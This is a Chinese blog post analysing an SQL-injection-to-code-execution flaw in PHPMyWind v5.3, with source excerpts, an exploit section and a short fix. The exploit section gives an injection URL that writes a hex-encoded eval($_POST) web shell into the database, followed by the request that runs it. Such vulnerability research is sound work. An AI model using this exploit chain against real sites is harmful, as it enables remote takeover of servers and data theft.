<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>phpmywind-v5.3任意代码执行</title>
  <link rel="icon" href="/favicon.ico">
  <link rel="apple-touch-icon" href="/public/img/head.png">
  <link rel="stylesheet" href="/public/css/amazeui.min.css">
  <link rel="stylesheet" href="/public/css/app.css">
  <link rel="stylesheet" href="/public/css/highlight-js/github.css">
</head>
<body>

<div class="am-container lp-container">
  <header class="am-topbar lp-topbar">
    <h1 class="am-topbar-brand">
      <a href="/">Tomato's Blog</a>
    </h1>
    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
      <ul class="am-nav am-nav-pills am-topbar-nav">
        <li><a href="/">Archives</a></li>
        <!-- <li><a href="#">Categories</a></li> -->
        <li><a href="/friends.html">Friends</a></li>
        <!-- <li><a href="#">About Me</a></li> -->
        <li><a href="/feed.xml">Feed</a></li>
      </ul>
    </div>
  </header>
</div>


<div class="am-container lp-container">
  <div class="lp-post">
    <div class="lp-post-header">
      <h1 class="lp-post-title">phpmywind-v5.3任意代码执行</h1>
      <div class="lp-post-meta">
        <i class="am-icon-calculator"></i><span class="lp-post-date">2015-10-28</span>
        <i class="am-icon-tags"></i><span class="lp-post-tags">vulnerability analysis, 0day</span>
      </div>
    </div>
    <div class="lp-post-content">
    <p><strong>测试环境</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>wamp+phpmywind-v5.3
</code></pre>
</div>

<p><strong>0x01漏洞分析</strong></p>

<p>先看全局文件include\common.inc.php</p>

<div class="highlighter-rouge"><pre class="highlight"><code>//检查外部传递的值并转义
function _RunMagicQuotes(&amp;$svar)
{
	//PHP5.4已经将此函数移除
    if(@!get_magic_quotes_gpc())
    {
        if(is_array($svar))
        {
            foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);
        }
        else
        {
            if(strlen($svar)&gt;0 &amp;&amp;
			   preg_match('#^(cfg_|GLOBALS|_GET|_POST|_SESSION|_COOKIE)#',$svar))
            {
				exit('不允许请求的变量值!');
            }

            $svar = addslashes($svar);
        }
    }
    return $svar;
}


//直接应用变量名称替代
foreach(array('_GET','_POST') as $_request)
{
	foreach($$_request as $_k =&gt; $_v)
	{
		if(strlen($_k)&gt;0 &amp;&amp;
		   preg_match('#^(GLOBALS|_GET|_POST|_SESSION|_COOKIE)#',$_k))
		{
			exit('不允许请求的变量名!');
		}

		${$_k} = _RunMagicQuotes($_v);
	}
}

</code></pre>
</div>
<p>这段代码的作用就是做全局的GPC转义以及注册全局变量，类似于一个为register_global。</p>

<p>看到4g.php</p>

<div class="highlighter-rouge"><pre class="highlight"><code>else if($m == 'show')
{
	require_once(PHPMYWIND_TEMP.'/default/mobile/show.php');
	exit();
}
</code></pre>
</div>

<p>我们继续跟进default/mobile/show.php这个文件,看到以下代码</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php require_once(dirname(__FILE__).'/nav.php'); ?&gt;
		&lt;!-- 栏目内容 --&gt;
		&lt;?php
		$row = $dosql-&gt;GetOne("SELECT * FROM `#@__infoclass` WHERE id = $cid AND checkinfo = 'true' ORDER BY orderid ASC");
		if(!empty($row['id']))
		{
		?&gt;
		&lt;div class="pubBox"&gt;
			&lt;div class="hd"&gt;
				&lt;h2&gt;&lt;?php echo $row['classname']; ?&gt;&lt;/h2&gt;
			&lt;/div&gt;
			&lt;div class="ft"&gt;
            	&lt;div class="subCont"&gt;
				&lt;?php
				switch($row['infotype'])
				{
					case 1:
						$tbname = '#@__infolist';
					break;
					case 2:
						$tbname = '#@__infoimg';
					break;
				}
				//增加一次点击量
				$dosql-&gt;ExecNoneQuery("UPDATE `$tbname` SET hits=hits+1 WHERE `id`=$id");
				$row = $dosql-&gt;GetOne("SELECT * from `$tbname` WHERE `id`=$id");
				?&gt;
</code></pre>
</div>

<p>值得注意的是<code class="highlighter-rouge">$row['infotype']</code>的值，如果这个变量的返回值为空的话，那么就会导致不会给<code class="highlighter-rouge">$tbname</code>这个变量赋值，并且<code class="highlighter-rouge">$tbname</code>进入了下面的sql语句中，位置就是表名。那我们可以通过控制cid的值，然后使<code class="highlighter-rouge">$row['infotype']</code>无返回值，进一步为$tbname变量赋值.很显然这里就是一个SQL注入了。</p>

<p>然后看到goodsshow.php文件</p>

<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>

			<span class="c1">//检测文档正确性
</span>			<span class="nv">$r</span> <span class="o">=</span> <span class="nv">$dosql</span><span class="o">-&gt;</span><span class="na">GetOne</span><span class="p">(</span><span class="s2">"SELECT * FROM `#@__goods` WHERE id=</span><span class="nv">$id</span><span class="s2">"</span><span class="p">);</span>
			<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$r</span><span class="p">)</span>
			<span class="p">{</span>
			<span class="c1">//增加一次点击量
</span>			<span class="nv">$dosql</span><span class="o">-&gt;</span><span class="na">ExecNoneQuery</span><span class="p">(</span><span class="s2">"UPDATE `#@__goods` SET hits=hits+1 WHERE id=</span><span class="nv">$id</span><span class="s2">"</span><span class="p">);</span>
			<span class="nv">$row</span> <span class="o">=</span> <span class="nv">$dosql</span><span class="o">-&gt;</span><span class="na">GetOne</span><span class="p">(</span><span class="s2">"SELECT * FROM `#@__goods` WHERE id=</span><span class="nv">$id</span><span class="s2">"</span><span class="p">);</span>
			<span class="cp">?&gt;</span>
			<span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'title'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="nt">&lt;/h1&gt;</span>
			<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"goodsarea"</span><span class="nt">&gt;</span> 
				<span class="c">&lt;!-- 组图区域开始--&gt;</span>
				<span class="cp">&lt;?php</span>
				<span class="c1">//判断显示缩略图或组图
</span>				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'picarr'</span><span class="p">]))</span>
				<span class="p">{</span>
					<span class="nv">$picarr</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'picarr'</span><span class="p">]);</span>
					<span class="nv">$picarrBig</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="nv">$picarr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
				<span class="cp">?&gt;</span>
				<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fl"</span><span class="nt">&gt;</span> <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"zoompic"</span> <span class="na">class=</span><span class="s">"cloud-zoom"</span> <span class="na">href=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrBig</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">alt=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrBig</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">rel=</span><span class="s">"adjustX:10, adjustY:0"</span><span class="nt">&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrBig</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="nt">/&gt;&lt;/a&gt;</span>
					<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"zoomlist"</span><span class="nt">&gt;</span>
						<span class="cp">&lt;?php</span>
						<span class="k">foreach</span><span class="p">(</span><span class="nv">$picarr</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
						<span class="p">{</span>
							<span class="nv">$picarrSmall</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
						<span class="cp">?&gt;</span>
						<span class="nt">&lt;li&gt;&lt;a</span> <span class="na">rel=</span><span class="s">"useZoom: 'zoompic', smallImage: '</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrSmall</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">'"</span> <span class="na">alt=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrBig</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">class=</span><span class="s">"cloud-zoom-gallery"</span> <span class="na">href=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrSmall</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$picarrSmall</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="nt">/&gt;&lt;/a&gt;&lt;/li&gt;</span>
						<span class="cp">&lt;?php</span>
						<span class="p">}</span>
						<span class="cp">?&gt;</span>
						<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"cl"</span><span class="nt">&gt;&lt;/div&gt;</span>
					<span class="nt">&lt;/ul&gt;</span>
					<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"cl"</span><span class="nt">&gt;&lt;/div&gt;</span>
				<span class="nt">&lt;/div&gt;</span>
				<span class="cp">&lt;?php</span>
				<span class="p">}</span>
				<span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'picurl'</span><span class="p">]))</span>
				<span class="p">{</span>
				<span class="cp">?&gt;</span>
				<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fl"</span><span class="nt">&gt;</span> <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"zoompic"</span> <span class="na">class=</span><span class="s">"cloud-zoom"</span> <span class="na">href=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'picurl'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">rel=</span><span class="s">"adjustX:10, adjustY:0"</span><span class="nt">&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'picurl'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="nt">/&gt;&lt;/a&gt;</span>
					<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"zoomlist"</span><span class="nt">&gt;</span>
						<span class="nt">&lt;li&gt;&lt;a</span> <span class="na">rel=</span><span class="s">"useZoom: 'zoompic', smallImage: '</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'picurl'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">' "</span> <span class="na">class=</span><span class="s">"cloud-zoom-gallery"</span> <span class="na">href=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'picurl'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'picurl'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="nt">/&gt;&lt;/a&gt;&lt;/li&gt;</span>
						<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"cl"</span><span class="nt">&gt;&lt;/div&gt;</span>
					<span class="nt">&lt;/ul&gt;</span>
					<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"cl"</span><span class="nt">&gt;&lt;/div&gt;</span>
				<span class="nt">&lt;/div&gt;</span>
				<span class="cp">&lt;?php</span>
				<span class="p">}</span>
				<span class="cp">?&gt;</span>
				<span class="c">&lt;!-- 组图区域结束 --&gt;</span> 
				<span class="c">&lt;!-- 商品信息开始 --&gt;</span>
				<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fr"</span><span class="nt">&gt;</span>
					<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"tb-meta"</span><span class="nt">&gt;</span>
						<span class="nt">&lt;li&gt;</span> <span class="nt">&lt;span&gt;</span>市场价<span class="nt">&lt;/span&gt;&lt;strong</span> <span class="na">class=</span><span class="s">"lt"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'marketprice'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="nt">&lt;/strong&gt;</span>元 <span class="nt">&lt;/li&gt;</span>
						<span class="nt">&lt;li&gt;</span> <span class="nt">&lt;span&gt;</span>促销价<span class="nt">&lt;/span&gt;&lt;strong</span> <span class="na">class=</span><span class="s">"price"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'salesprice'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="nt">&lt;/strong&gt;</span>元 <span class="nt">&lt;/li&gt;</span>
						<span class="nt">&lt;li&gt;</span> <span class="nt">&lt;span&gt;</span>浏览数<span class="nt">&lt;/span&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'hits'</span><span class="p">];</span> <span class="cp">?&gt;</span> 次<span class="nt">&lt;/li&gt;</span>
						<span class="nt">&lt;li&gt;</span> <span class="nt">&lt;span&gt;</span>配　送<span class="nt">&lt;/span&gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'payfreight'</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span><span class="k">echo</span> <span class="s1">'买家承担运费'</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="k">echo</span> <span class="s1">'商家承担运费'</span><span class="p">;}</span> <span class="cp">?&gt;</span><span class="nt">&lt;/li&gt;</span>
					<span class="nt">&lt;/ul&gt;</span>
					<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tb-skin"</span><span class="nt">&gt;</span>
						<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"tb-note-title"</span><span class="nt">&gt;&lt;span&gt;</span>请选择您要的商品信息<span class="nt">&lt;/span&gt;&lt;a</span> <span class="na">href=</span><span class="s">"shoppingcart.php"</span> <span class="na">class=</span><span class="s">"end"</span><span class="nt">&gt;</span>结算购物车<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
						<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"gform"</span> <span class="na">id=</span><span class="s">"gform"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
							<span class="nt">&lt;dl</span> <span class="na">class=</span><span class="s">"tb-prop"</span><span class="nt">&gt;</span>
							<span class="cp">&lt;?php</span>

							<span class="c1">//将商品属性id与值组成数组
</span>							<span class="nv">$rowattr</span> <span class="o">=</span> <span class="nx">String2Array</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'attrstr'</span><span class="p">]);</span>
							<span class="nv">$row2</span> <span class="o">=</span> <span class="nv">$dosql</span><span class="o">-&gt;</span><span class="na">Execute</span><span class="p">(</span><span class="s1">'SELECT * FROM `#@__goodsattr` WHERE `goodsid`='</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'typeid'</span><span class="p">]</span><span class="o">.</span><span class="s2">" AND `checkinfo`=true"</span><span class="p">);</span>
							<span class="k">if</span><span class="p">(</span><span class="nv">$dosql</span><span class="o">-&gt;</span><span class="na">GetTotalRow</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
							<span class="p">{</span>
								<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
								<span class="k">while</span><span class="p">(</span><span class="nv">$row2</span> <span class="o">=</span> <span class="nv">$dosql</span><span class="o">-&gt;</span><span class="na">GetArray</span><span class="p">())</span>
								<span class="p">{</span>
							<span class="cp">?&gt;</span>
								<span class="nt">&lt;dt&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row2</span><span class="p">[</span><span class="s1">'attrname'</span><span class="p">];</span> <span class="cp">?&gt;</span>：<span class="nt">&lt;/dt&gt;</span>
								<span class="nt">&lt;dd&gt;</span>
									<span class="cp">&lt;?php</span>
								<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$rowattr</span><span class="p">[</span><span class="nv">$row2</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]]))</span>
								<span class="p">{</span>
									<span class="k">echo</span> <span class="s1">'&lt;div id="attrdiv_'</span><span class="o">.</span><span class="nv">$row2</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'"&gt;'</span><span class="p">;</span>
									<span class="nv">$dfvalue</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
									<span class="nv">$rowattrs</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span><span class="nv">$rowattr</span><span class="p">[</span><span class="nv">$row2</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]]);</span>
									<span class="k">foreach</span><span class="p">(</span><span class="nv">$rowattrs</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span>
									<span class="p">{</span>
										<span class="k">echo</span> <span class="s1">'&lt;a href="javascript:;" onclick="SelAttr(this,'</span><span class="o">.</span><span class="nv">$row2</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s1">',\''</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">'\');"'</span><span class="p">;</span>
										<span class="k">if</span><span class="p">(</span><span class="nv">$k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
										<span class="p">{</span>
											<span class="nv">$dfvalue</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
											<span class="k">echo</span> <span class="s1">'class="selected"'</span><span class="p">;</span>
										<span class="p">}</span>
										<span class="k">echo</span> <span class="s1">'&gt;'</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">'&lt;/a&gt;'</span><span class="p">;</span>
									<span class="p">}</span>
									<span class="k">echo</span> <span class="s1">'&lt;input type="hidden" name="attrid_'</span><span class="o">.</span><span class="nv">$row2</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'" id="attrid_'</span><span class="o">.</span><span class="nv">$row2</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'" value="'</span><span class="o">.</span><span class="nv">$dfvalue</span><span class="o">.</span><span class="s1">'" /&gt;'</span><span class="p">;</span>
									<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
								<span class="p">}</span>
								<span class="cp">?&gt;</span>
								<span class="nt">&lt;/dd&gt;</span>
								<span class="cp">&lt;?php</span>
									<span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
								<span class="p">}</span>
							<span class="p">}</span>
							<span class="cp">?&gt;</span>
</code></pre>
</div>

<p>我们重点关注一下String2Array函数，可以在\include\commnon.fun.php找到定义</p>

<div class="highlighter-rouge"><pre class="highlight"><code>if(!function_exists('String2Array'))
{
	function String2Array($data)
	{
		if($data == '') return array();
		@eval("\$array = $data;");
		return $array;
	}
}
</code></pre>
</div>

<p>很明显这会造成一个代码执行。我们再次回到上面的代码。<code class="highlighter-rouge">$rowattr = String2Array($row['attrstr']);</code>其中<code class="highlighter-rouge">$row['attrstr']</code>是通过<code class="highlighter-rouge">SELECT * FROM `#@__goods` WHERE id=$id</code>这个语句获取的。如果我们能修改<code class="highlighter-rouge">#@__goods</code>表里面的attrstr字段值的话，那就可以造成任意代码执行了。刚好可以配合前面的一个SQL注入。这样就能完美发挥这个漏洞了。</p>

<p><strong>0x02漏洞利用</strong></p>

<p>由于在这个cms里面存在全局的GPC过滤，所以我们不能使用单引号。这样会转义。因此我们在update的时候可以用十六进制的方法。</p>

<p>第一步我们构造</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://127.0.0.1/PHPMyWind_5.3/4g.php?m=show&amp;cid=2&amp;tbname=pmw_goods`  SET attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29 where classid=12  or @`'` %23 and @`'`

</code></pre>
</div>
<p>这个cms有80sec的防注入，所以我们要绕过这个防注入。网上有详细的文章，这里就不复述了。</p>

<p>然后可以看到数据库里</p>

<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-308065326.png" alt="308065326" /></p>

<p>这里已经被成功update进去一个一句话木马了。</p>

<p>第二步
访问
http://127.0.0.1/PHPMyWind_5.3/goodsshow.php?cid=12&amp;tid=10&amp;id=1</p>

<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2215906991.png" alt="2215906991" /></p>

<p>成功执行代码</p>

<p><strong>0x03漏洞修复</strong></p>

<p>初始化<code class="highlighter-rouge">$tanm</code>,不使用eval函数</p>


    </div>
    
    <div id="disqus_thread"></div>
<script type="text/javascript">
var disqus_shortname = "tomatos-blog";

/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>
</div>

<div class="am-container lp-container">
  <footer class="am-footer lp-footer">
    <p>Copyright © 2014-2017 All Rights Reserved</p>
    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
  </afooter>
</div>


<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
  <a href="#top" title="回到顶部">
    <span class="am-gotop-title">GoTop</span>
    <i class="am-gotop-icon am-icon-chevron-up"></i>
  </a>
</div>

<script src="/public/js/jquery.min.js"></script>
<script src="/public/js/amazeui.min.js"></script>
<script>
$(document).ready(function(){
  $.AMUI.progress.start();
});
$(window).load(function(){
  $.AMUI.progress.done();
});
</script>
<script src="/public/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<!-- 网站统计代码 -->
<div hidden>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</div>
<div hidden>
<script>
var _hmt = _hmt || [];
(function() {
var hm = document.createElement("script");
hm.src = "//hm.baidu.com/hm.js?3601be0ac702a94d879f3f571cec1e53";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(hm, s);
})();
</script>
</div>
</body>
</html>
